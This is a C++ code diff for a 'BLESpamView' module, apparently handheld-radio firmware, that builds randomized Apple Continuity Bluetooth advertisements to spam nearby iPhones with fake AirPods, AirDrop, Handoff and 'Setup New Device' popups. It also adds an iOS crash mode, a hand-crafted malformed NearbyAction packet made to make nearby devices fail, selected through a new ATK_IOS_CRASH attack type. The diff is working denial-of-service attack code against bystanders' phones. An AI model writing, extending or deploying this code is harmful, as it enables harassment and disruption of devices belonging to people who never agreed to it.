@@ -141,10 +141,22 @@ void BLESpamView::furi_hal_random_fill_buf(uint8_t* buf, uint32_t len) {
     }
 }
 
-void BLESpamView::createIosPacket() {
-    // ContinuityTypeProximityPair, len: 6+25
-    uint8_t size = 6 + 25;
-    uint8_t type = 0;  // ContinuityTypeProximityPair
+void BLESpamView::createIosPacket(bool crash = false) {
+    ContinuityCfg* cfg = NULL;
+
+    ContinuityType type;
+    if (cfg && cfg->type != 0x00) {
+        type = cfg->type;
+    } else {
+        const ContinuityType types[] = {
+            ContinuityTypeProximityPair,
+            ContinuityTypeNearbyAction,
+        };
+        type = types[rand() % COUNT_OF(types)];
+    }
+    if (crash) type = ContinuityTypeCustomCrash;
+
+    uint8_t size = packet_sizes[type];
     uint8_t* packet = (uint8_t*)malloc(size);
     uint8_t i = 0;
 
@@ -155,30 +167,182 @@ void BLESpamView::createIosPacket() {
     packet[i++] = type;        // Continuity Type
     packet[i] = size - i - 1;  // Continuity Size
     i++;
-    uint8_t model_index = rand() % iosModels_count;
-    uint16_t model = iosModels[model_index].value;
-    uint8_t color = rand() % iosModels[model_index].count;
-    uint8_t prefix = 0x07;
-    if (model == 0x0055 || model == 0x0030)
-        prefix = 0x05;
-    else
-        prefix = 0x01;
-    packet[i++] = prefix;                                // Prefix (paired 0x01 new 0x07 airtag 0x05)
-    packet[i++] = (model >> 0x08) & 0xFF;                // Device Model
-    packet[i++] = (model >> 0x00) & 0xFF;                // ...
-    packet[i++] = 0x55;                                  // Status
-    packet[i++] = ((rand() % 10) << 4) + (rand() % 10);  // Buds Battery Level
-    packet[i++] = ((rand() % 8) << 4) + (rand() % 10);   // Charing Status and Battery Case Level
-    packet[i++] = (rand() % 256);                        // Lid Open Counter
-    packet[i++] = color;                                 // Device Color
-    packet[i++] = 0x00;
-    furi_hal_random_fill_buf(&packet[i], 16);  // Encrypted Payload
-    i += 16;
+
+    switch (type) {
+        case ContinuityTypeAirDrop: {
+            packet[i++] = 0x00;            // Zeros
+            packet[i++] = 0x00;            // ...
+            packet[i++] = 0x00;            // ...
+            packet[i++] = 0x00;            // ...
+            packet[i++] = 0x00;            // ...
+            packet[i++] = 0x00;            // ...
+            packet[i++] = 0x00;            // ...
+            packet[i++] = 0x00;            // ...
+            packet[i++] = 0x01;            // Version
+            packet[i++] = (rand() % 256);  // AppleID
+            packet[i++] = (rand() % 256);  // ...
+            packet[i++] = (rand() % 256);  // Phone Number
+            packet[i++] = (rand() % 256);  // ...
+            packet[i++] = (rand() % 256);  // Email
+            packet[i++] = (rand() % 256);  // ...
+            packet[i++] = (rand() % 256);  // Email2
+            packet[i++] = (rand() % 256);  // ...
+            packet[i++] = 0x00;            // Zero
+            break;
+        }
+
+        case ContinuityTypeProximityPair: {
+            uint16_t model;
+            uint8_t color;
+            switch (PayloadModeRandom) {
+                case PayloadModeRandom:
+                default: {
+                    uint8_t model_index = rand() % pp_models_count;
+                    uint8_t color_index = rand() % pp_models[model_index].colors_count;
+                    model = pp_models[model_index].value;
+                    color = pp_models[model_index].colors[color_index].value;
+                    break;
+                }
+                case PayloadModeValue:
+                    model = cfg->data.proximity_pair.model;
+                    color = cfg->data.proximity_pair.color;
+                    break;
+            }
+
+            uint8_t prefix;
+            if (cfg && cfg->data.proximity_pair.prefix != 0x00) {
+                prefix = cfg->data.proximity_pair.prefix;
+            } else {
+                if (model == 0x0055 || model == 0x0030)
+                    prefix = 0x05;
+                else
+                    prefix = 0x01;
+            }
+
+            packet[i++] = prefix;                                // Prefix (paired 0x01 new 0x07 airtag 0x05)
+            packet[i++] = (model >> 0x08) & 0xFF;                // Device Model
+            packet[i++] = (model >> 0x00) & 0xFF;                // ...
+            packet[i++] = 0x55;                                  // Status
+            packet[i++] = ((rand() % 10) << 4) + (rand() % 10);  // Buds Battery Level
+            packet[i++] = ((rand() % 8) << 4) + (rand() % 10);   // Charing Status and Battery Case Level
+            packet[i++] = (rand() % 256);                        // Lid Open Counter
+            packet[i++] = color;                                 // Device Color
+            packet[i++] = 0x00;
+            furi_hal_random_fill_buf(&packet[i], 16);  // Encrypted Payload
+            i += 16;
+            break;
+        }
+
+        case ContinuityTypeAirplayTarget: {
+            packet[i++] = (rand() % 256);  // Flags
+            packet[i++] = (rand() % 256);  // Configuration Seed
+            packet[i++] = (rand() % 256);  // IPv4 Address
+            packet[i++] = (rand() % 256);  // ...
+            packet[i++] = (rand() % 256);  // ...
+            packet[i++] = (rand() % 256);  // ...
+            break;
+        }
+
+        case ContinuityTypeHandoff: {
+            packet[i++] = 0x01;            // Version
+            packet[i++] = (rand() % 256);  // Initialization Vector
+            packet[i++] = (rand() % 256);  // ...
+            packet[i++] = (rand() % 256);  // AES-GCM Auth Tag
+            packet[i++] = (rand() % 256);  // Encrypted Payload
+            packet[i++] = (rand() % 256);  // ...
+            packet[i++] = (rand() % 256);  // ...
+            packet[i++] = (rand() % 256);  // ...
+            packet[i++] = (rand() % 256);  // ...
+            packet[i++] = (rand() % 256);  // ...
+            packet[i++] = (rand() % 256);  // ...
+            packet[i++] = (rand() % 256);  // ...
+            packet[i++] = (rand() % 256);  // ...
+            packet[i++] = (rand() % 256);  // ...
+            break;
+        }
+
+        case ContinuityTypeTetheringSource: {
+            packet[i++] = 0x01;            // Version
+            packet[i++] = (rand() % 256);  // Flags
+            packet[i++] = (rand() % 101);  // Battery Life
+            packet[i++] = 0x00;            // Cell Service Type
+            packet[i++] = (rand() % 8);    // ...
+            packet[i++] = (rand() % 5);    // Cell Service Strength
+            break;
+        }
+
+        case ContinuityTypeNearbyAction: {
+            uint8_t action;
+            switch (PayloadModeRandom) {
+                case PayloadModeRandom:
+                default:
+                    action = na_actions[rand() % na_actions_count].value;
+                    break;
+                case PayloadModeValue:
+                    action = cfg->data.nearby_action.action;
+                    break;
+            }
+
+            uint8_t flags;
+            if (cfg && cfg->data.nearby_action.flags != 0x00) {
+                flags = cfg->data.nearby_action.flags;
+            } else {
+                flags = 0xC0;
+                if (action == 0x20 && rand() % 2) flags--;       // More spam for 'Join This AppleTV?'
+                if (action == 0x09 && rand() % 2) flags = 0x40;  // Glitched 'Setup New Device'
+            }
+
+            packet[i++] = flags;                      // Action Flags
+            packet[i++] = action;                     // Action Type
+            furi_hal_random_fill_buf(&packet[i], 3);  // Authentication Tag
+            i += 3;
+            break;
+        }
+
+        case ContinuityTypeNearbyInfo: {
+            packet[i++] = ((rand() % 16) << 4) + (rand() % 16);  // Status Flags and Action Code
+            packet[i++] = (rand() % 256);                        // Status Flags
+            packet[i++] = (rand() % 256);                        // Authentication Tag
+            packet[i++] = (rand() % 256);                        // ...
+            packet[i++] = (rand() % 256);                        // ...
+            break;
+        }
+
+        case ContinuityTypeCustomCrash: {
+            // Found by @ECTO-1A
+
+            uint8_t action = na_actions[rand() % na_actions_count].value;
+            uint8_t flags = 0xC0;
+            if (action == 0x20 && rand() % 2) flags--;       // More spam for 'Join This AppleTV?'
+            if (action == 0x09 && rand() % 2) flags = 0x40;  // Glitched 'Setup New Device'
+
+            i -= 2;                                    // Override segment header
+            packet[i++] = ContinuityTypeNearbyAction;  // Continuity Type
+            packet[i++] = 5;                           // Continuity Size
+            packet[i++] = flags;                       // Action Flags
+            packet[i++] = action;                      // Action Type
+            furi_hal_random_fill_buf(&packet[i], 3);   // Authentication Tag
+            i += 3;
+
+            packet[i++] = 0x00;  // Additional Action Data Terminator (?)
+            packet[i++] = 0x00;  // ...
+
+            packet[i++] = ContinuityTypeNearbyInfo;   // Continuity Type (?)
+            furi_hal_random_fill_buf(&packet[i], 3);  // Continuity Size (?) + Shenanigans (???)
+            i += 3;
+            break;
+        }
+
+        default:
+            break;
+    }
+    // size, packet
     std::string res = to_string_hex_array(packet, size);
     memset(advertisementData, 0, sizeof(advertisementData));
     std::copy(res.begin(), res.end(), advertisementData);
     free(packet);
 }
+
 void BLESpamView::createFastPairPacket() {
     uint32_t model;
     model = fastpairModels[rand() % fastpairModels_count].value;
@@ -203,8 +367,11 @@ void BLESpamView::changePacket(bool forced = false) {
         randomChn();
         if (randomDev || forced) {
             switch (attackType) {
+                case ATK_IOS_CRASH:
+                    createIosPacket(true);
+                    break;
                 case ATK_IOS:
-                    createIosPacket();
+                    createIosPacket(false);
                     break;
                 default:
                 case ATK_ANDROID:
